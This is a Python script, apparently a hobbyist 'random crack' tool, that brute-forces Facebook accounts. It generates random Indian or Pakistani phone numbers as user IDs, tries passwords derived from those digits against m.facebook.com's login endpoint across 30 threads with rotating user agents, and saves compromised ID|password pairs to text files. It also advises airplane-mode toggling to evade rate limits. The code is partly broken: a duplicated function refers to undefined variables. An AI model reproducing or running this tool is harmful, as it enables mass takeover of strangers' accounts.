#!/usr/bin/python3
#-*-coding:utf-8-*-
import os

try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')

try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
    
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
    
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
	os.system('python num.py')
  
agents = ["Mozilla/5.0 (Linux; Android 12; SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36"
				"Mozilla/5.0 (Linux; Android 10; moto g(8) power lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Mobile Safari/537.36"
				"Mozilla/5.0 (Linux; Android 6.0.1; SM-P355M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36"
				"Mozilla/5.0 (Linux; Android 9; VKY-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Mobile Safari/537.36"
				"Mozilla/5.0 (Linux; Android 11; LM-K525) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Mobile Safari/537.36"
				"Mozilla/5.0 (Linux; Android 10; Twist 4G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36"
				"Mozilla/5.0 (Linux; Android 9; moto g(8) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36"
				"Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Mobile Safari/537.36"]
logo = """\033[1;37;1m
  """"\033[1;37;1m/
  ______   __    __  __    __ 
 /      \ |  \  |  \|  \  |  \
|  $$$$$$\| $$  | $$| $$  | $$
| $$__| $$| $$  | $$| $$__| $$
| $$    $$| $$  | $$| $$    $$
| $$$$$$$$| $$  | $$| $$$$$$$$
| $$  | $$| $$__/ $$| $$  | $$
| $$  | $$ \$$    $$| $$  | $$
 \$$   \$$  \$$$$$$  \$$   \$$
                              
                              
                              

\033[1;37;1m[!]======================================================
         \033[1;31m•\033[1;93m•\033[1;37m\x1b[0;91m [ WELLCOME TO AHSAM TOOLS ]\x1b[0;34m \033[1;33m•\033[1;91m•\033[1;37m
\033[1;37;1m[!]======================================================
\033[1;37;1m[•] Author   : MR-AUH
\033[1;37;1m[•] Facebook : www.facebook.com/AHSAM.JOIYA
\033[1;37;1m[•] Whatsapp : 03173988160
\033[1;37;1m[•] GitHub   : AHSAMJOIYA302
\033[1;37;1m[•] Youtube  : TRICKER AHSAMU
\033[1;37;1m[•] Virson   : 0.0.4
\033[1;37;1m[!]======================================================"""  
loop = 0
oks = []
cps = []

#global functions
def dynamic(text):
	titik = ['.   ','..  ','... ','.... ']
	for o in titik:
		print('\r'+text+o),
		sys.stdout.flush();time.sleep(1)
def menu():
	os.system('clear')
	print(logo)
	print('[1] \033[1;32;1mRandom crack')
	print ('\033[1;37;1m[!]======================================================')
	opt = input('[?] Choose : ')
	if opt =='1':
		os.system('xdg-open https://www.facebook.com/AHSAM.JOIYA')
		random_crack()  
def random_crack():
	os.system('clear')
	print(logo)
	print('[1] India Random Uid Clone')
	print('[2] Pak Random Uid Clone')
	print('[3] Subscribe YouTube Channel')
	print('[4] Follow Me On Facebook')
	print('[5] Join WP Group For more Commond')
	print('[0] \033[1;31;1mExit Program')
	print ('\033[1;37;1m[!]======================================================')
	opt = input('[!] Choose : ')
	if opt =='1':
		os.system("xdg-open https://www.facebook.com/YOUR.DAD.SUBHAN")
		random_number()
	elif opt =='2':
		os.system("xdg-open https://www.facebook.com/YOUR.DAD.SUBHAN")
		random_pak_number()
	elif opt =='3':
		os.system("xdg-open https://youtube.com/channel/UCo8QluEsIV_rV2StJQCAUKw")
		random_crack()  
	elif opt =='4':
		os.system("xdg-open https://www.facebook.com/AHSAM.JOIYA")
		random_crack()  
	elif opt =='5':
		os.system("xdg-open https://chat.whatsapp.com/")
		random_crack()  
	elif opt =='0':
		exit("\n [✓] Thank you so much♥️\n")
	else:
		print('\033[1;91mChoose valid option\033[0;97m')

def random_number():
	user=[]
	os.system('clear')
	print(logo)
	print('[+] For Indian Enter Four Digit Code (9934)')
	print(47*'-')
	kode = input('[!] Input Code : ')
	print(47*'-')
	limit = int(input('[?]\033[1;32;1m How many numbers do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(6))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print ('\033[1;37;1m[!]======================================================')
		print('[+] Total Ids : \033[1;92m'+tl)
		print('\033[1;97m[+] Code You Chose : \033[1;92m'+kode)
		print('\033[1;37;1m[$] Brute Has been started...(\033[1;92mIndia\033[1;97m)')
		print('[+] USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE')
		print ('\033[1;37;1m[!]======================================================')
		for guru in user:
			uid = kode+guru
			pwx = [guru]
			pwx = [kode+guru]
			yaari.submit(rcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	print(' Press Inter To Back Menu')
	menu()
	
    
def rcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global agents
	try:
		for ps in pwx:
			session = requests.Session()
			pro = random.choice(agents)
			free_fb = session.get('https://m.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'m.facebook.com',
			'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': pro}
			sys.stdout.write('\r\033[1;32m [AHSAM] \033[1;97m%s/%s   \033[1;92mOK-:%s | \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
			sys.stdout.flush()
			lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\033[1;92m[AHSAM-OK] '+cid+' | '+ps+'\033[0;97m')
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[AHSAM-CP] '+cid+' | '+ps+'\033[0;97m')
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r\033[1;32m [AHSAM] \033[1;97m%s/%s   \033[1;92mOK-:%s | \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
	except:
		pass

def random_pak_number():
	user=[]
	os.system('clear')
	print(logo)
	print('[+]\033[1;32;1m   For Pak Enter Four Digit Code Example (92301)')
	print ('\033[1;37;1m[!]======================================================')
	kode = input('[!] Input Code : ')
	print ('\033[1;37;1m[!]======================================================')
	limit = int(input('[?]\033[1;32;1m How many numbers do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print ('\033[1;37;1m[!]======================================================')
		print('[+] Total Ids : \033[1;92m'+tl)
		print('\033[1;97m[+] Code You Chose : \033[1;92m'+kode)
		print('\033[1;37;1m[$] Brute Has been started...(\033[1;92mPakistan\033[1;97m)')
		print('[+] USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE FOR SPEED UP CRACK')
		print ('\033[1;37;1m[!]======================================================')
		for guru in user:
			uid = kode+guru
			pwx = [guru]
			yaari.submit(rcrack,uid,pwx,tl)
	print ('\033[1;37;1m[!]======================================================')
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print ('\033[1;37;1m[!]======================================================')
	print(' Press Inter To Back Menu')
	menu()
    
def rcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global agents
	try:
		for ps in pwx:
			session = requests.Session()
			pro = random.choice(agents)
			free_fb = session.get('https://m.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'m.facebook.com',
			'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': pro}
			lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\033[1;92m[AHSAM-OK] '+cid+' | '+ps+'\033[0;97m')
				open('subhan-ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;93m[AHSAM-CP] '+cid+' | '+ps+'\033[0;97m')
				open('subhan-cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r\033[1;97m[\033[1;92mJUSTIN\033[1;91m♡\033[1;92mAHSAM\033[1;97m] %s/%s  [\033[1;92mOK\033[1;97m-:\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m-:\033[1;91m%s\033[1;97m]'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
	except:
		pass
menu()
